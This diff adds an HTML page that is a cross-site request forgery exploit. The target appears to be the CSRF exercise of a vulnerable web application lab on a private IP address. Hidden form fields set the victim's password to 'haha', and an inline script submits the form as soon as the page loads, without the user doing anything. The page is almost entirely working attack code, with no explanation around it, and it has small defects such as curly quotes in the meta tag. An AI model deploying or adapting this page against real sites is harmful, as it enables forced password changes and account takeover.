@@ -1,0 +1,14 @@
+<html>
+        <head>
+                <meta charset="utf-8">
+                <meta name=”referrer” content=”http://10.10.89.70/vulnerabilities/csrf/?password_new=haha&password_conf=haha&Submit=Submit”>
+        </head>
+        <body>
+                <form id="form" action="http://10.10.89.70/vulnerabilities/csrf/" method="GET">
+                        <input type = "hidden" name="password_new" value="haha"/>
+                        <input type="hidden" name="password_conf" value="haha"/>
+                        <input type = "hidden" name="Submit" value="Submit"/>i
+                </form>
+                <script> document.getElementById("form").submit()</script>
+        </body>
+</html>
